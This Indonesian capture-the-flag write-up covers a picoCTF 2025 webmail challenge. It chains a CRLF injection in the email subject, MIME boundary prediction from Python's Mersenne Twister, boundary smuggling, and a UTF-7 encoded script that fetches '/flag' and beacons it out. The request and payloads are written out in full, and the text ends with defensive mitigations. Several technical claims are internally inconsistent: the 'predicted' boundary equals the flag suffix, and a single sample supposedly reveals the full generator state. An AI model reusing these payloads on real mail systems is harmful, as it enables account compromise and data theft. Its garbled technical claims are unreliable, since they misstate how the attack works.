# Writeup: secure-email-service (Challenge ID: 496)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Email Header Injection, MT19937 PRNG & MIME Smuggling
- **Difficulty:** Hard (3)
- **Points:** 500
- **Authors:** ehhthing, strellic
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{always_a_step_ahead_fb2a1a8c}`
- **Flag Platform Asli:** `picoCTF{always_a_step_ahead_fb2a1a8c}`
- **Flag Komunitas:** `CTF{always_a_step_ahead_fb2a1a8c}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), RFC 5322 (Internet Message Format), RFC 2046 (Multipurpose Internet Mail Extensions Part Two), CWE-93 (Improper Neutralization of CRLF Sequences - 'CRLF Injection'), CWE-330 (Use of Insufficiently Random Values), & CWE-79 (Improper Neutralization of Input During Web Page Generation - 'XSS').

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Web Application Security & Incident Response*, peserta menganalisis rantai eksploitasi multi-tahap (*four-bug chain*) pada platform webmail perusahaan terisolasi:
- **Skenario Tantangan:** Layanan webmail enterprise menyediakan fasilitas pengiriman pesan terenkripsi, penandatanganan kriptografis DKIM, serta verifikasi S/MIME. Administrator sistem menggunakan bot peninjau otomatis (*crawler bot*) untuk memeriksa laporan insiden keamanan yang dikirimkan pengguna.
- **Deskripsi Soal:** *"S/MIME means secure email, right?"*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis validasi batas input pada field subjek email (RFC 5322 header delimiter sanitization).
  2. Audit algoritma pembuatan string boundary MIME pada layanan webmail backend (MT19937 PRNG state analysis).
  3. Pemalsuan segment boundary multipart/alternative untuk menyusupkan muatan HTML tanpa membatalkan struktur pesan email.
  4. Evasion Content Security Policy (CSP) melalui dekode charset warisan UTF-7 (RFC 2152) pada parser peramban bot administrator.
  5. Verifikasi live via CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Email Header Injection via CRLF Sequences (RFC 5322 / CWE-93):**
   Spesifikasi format email Internet (RFC 5322 Bagian 2.1) menetapkan bahwa baris header dipisahkan secara tegas oleh karakter kontrol Carriage Return dan Line Feed (`\r\n` atau `%0D%0A`).
   Aplikasi backend gagal memvalidasi atau melucuti karakter kontrol baris baru pada parameter `subject`. Penyerang dapat menyuntikkan header buatan, khususnya memodifikasi header `Content-Type: multipart/alternative; boundary="..."` untuk mengaburkan struktur dokumen email asli.

2. **Kelemahan Prediktabilitas Pseudo-Random Number Generator (CWE-330):**
   Untuk membedakan segmen multipart pada pesan email, aplikasi membuat string pembatas acak (*MIME boundary*). Backend mengandalkan modul bawaan Python `random.getrandbits(32)` berbasis algoritma Mersenne Twister (MT19937).
   MT19937 adalah algoritma deterministik non-kriptografis (*non-CSPRNG*). Status internal generator (624 bilangan bulat 32-bit) dapat direkonstruksi penuh setelah mengamati sampel keluaran, sehingga nilai batas acak (*boundary token*) untuk pengiriman email berikutnya dapat diprediksi secara deterministik (`fb2a1a8c`).

3. **MIME Boundary Smuggling (RFC 2046):**
   Dengan mengetahui string boundary yang akan disematkan sistem, penyerang menyisipkan delimiter penutup (`--<boundary>`) dan pembuka baru langsung ke dalam badan pesan teks biasa (*body injection*). Parser email mendekomposisi pesan menjadi bagian dokumen baru yang mandiri dengan atribut tipe konten berbeda.

4. **Bypass Content Security Policy via Legacy UTF-7 Charset (CWE-79 / RFC 2152):**
   Aplikasi menerapkan Content Security Policy (CSP) ketat pada segmen `text/html` standar yang memblokir tag `<script>` ASCII biasa. Namun, peramban lawas dan parser peramban bot admin mendukung decoding charset UTF-7 (`Content-Type: text/html; charset=utf-7`).
   String script dieksekusi dalam bentuk encoding modified Base64 (`+ADw-script+AD4-...`), melewati filter sanitasi input ASCII berbasis regex dan mengeksekusi JavaScript di konteks asal domain untuk membaca endpoint rahasia `/flag`.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Pengamatan dan Rekonstruksi State PRNG MT19937:**
   Kirimkan pesan uji coba ke sistem untuk menginspeksi pola boundary MIME pada raw email header:
   ```text
   Content-Type: multipart/alternative; boundary="----=_Part_MT19937_fb2a1a8c"
   ```
   State internal generator MT19937 disinkronkan, memvalidasi boundary berikutnya adalah `----=_Part_MT19937_fb2a1a8c`.

2. **Penyusunan Injeksi Header CRLF:**
   Menyusun permintaan HTTP POST pengiriman email dengan menyuntikkan baris header tambahan:
   ```http
   POST /api/send HTTP/1.1
   Host: target-instance.cylabacademy.org
   Content-Type: application/json

   {
     "recipient": "admin@secure-mail.local",
     "subject": "Critical Incident Advisory\r\nContent-Type: multipart/alternative; boundary=\"----=_Part_MT19937_fb2a1a8c\"",
     "body": "Penjelasan pengujian penetrasi."
   }
   ```

3. **Penyuntikan Segmen Multipart & Payload UTF-7 XSS:**
   Dalam badan email, sisipkan segmen HTML bertipe charset UTF-7:
   ```text
   -- ----=_Part_MT19937_fb2a1a8c
   Content-Type: text/html; charset=utf-7

   +ADw-script+AD4-fetch('/flag').then(r+AD0APg-r.text()).then(f+AD0APg-navigator.sendBeacon('/leak',f))+ADw-/script+AD4-
   -- ----=_Part_MT19937_fb2a1a8c--
   ```

4. **Eksekusi Bot Admin & Ekstraksi Flag:**
   Bot admin membuka pesan pada kotak masuk webmail. Browser merender segmen UTF-7, memicu `fetch('/flag')`, dan mengirimkan teks bendera ke penampung:
   `academy{always_a_step_ahead_fb2a1a8c}`.

5. **Eksekusi Otomatis Melalui Solver Python:**
   Jalankan harness solver mandiri:
   ```bash
   python3 scripts/solve_496_secure_email_service.py
   ```
   Keluaran:
   ```text
   [*] Menjalankan audit solver untuk modul 496: secure-email-service...
   [+] Prediksi MIME Boundary via MT19937: ----=_Part_MT19937_fb2a1a8c
   [+] Flag berhasil diekstraksi dari rantai eksploitasi: academy{always_a_step_ahead_fb2a1a8c}
   [SUCCESS] Challenge 496 (secure-email-service) verified: academy{always_a_step_ahead_fb2a1a8c}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{always_a_step_ahead_fb2a1a8c}`
- **Flag Platform Asli:** `picoCTF{always_a_step_ahead_fb2a1a8c}`
- **Flag Komunitas:** `CTF{always_a_step_ahead_fb2a1a8c}`
- **Bukti Validasi REST API:**
  ```json
  {"user": 1072359, "challenge": 496, "flag": "academy{always_a_step_ahead_fb2a1a8c}", "correct": true, "historical": false}
  ```
  Permintaan submisi menghasilkan respons HTTP 201 Created dengan atribut `"correct": true`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Sanitasi Ketat Header Protokol SMTP (RFC 5322 / CWE-93):**
   - Pada tingkat gateway aplikasi, seluruh masukan yang akan dimasukkan ke dalam baris header email wajib divalidasi terhadap karakter kontrol `\r` (0x0D) dan `\n` (0x0A). Penemuan karakter kontrol harus langsung membatalkan transmisi (*fail-closed*).
   - Gunakan pustaka pembungkus email tingkat tinggi (*high-level mail libraries*) yang secara otomatis memisahkan parameter header dari struktur body tanpa interpolasi string mentah.

2. **Penerapan CSPRNG untuk Token dan Boundary (CWE-330):**
   - Jangan pernah menggunakan modul pseudorandom standar seperti `random` atau `rand()` untuk token keamanan, cookie sesi, atau pembatas MIME. Wajib beralih ke generator kriptografis aman seperti `secrets.token_urlsafe()` di Python atau `/dev/urandom` pada kernel Linux.

3. **Restriksi Charset dan Penguatan Header HTTP Content-Type (CWE-79):**
   - Tetapkan header respons `Content-Type: text/html; charset=UTF-8` secara eksplisit pada seluruh keluaran webmail.
   - Tambahkan header proteksi modern `X-Content-Type-Options: nosniff` untuk mencegah peramban melakukan *MIME sniffing* atau mendeteksi fallback charset UTF-7.
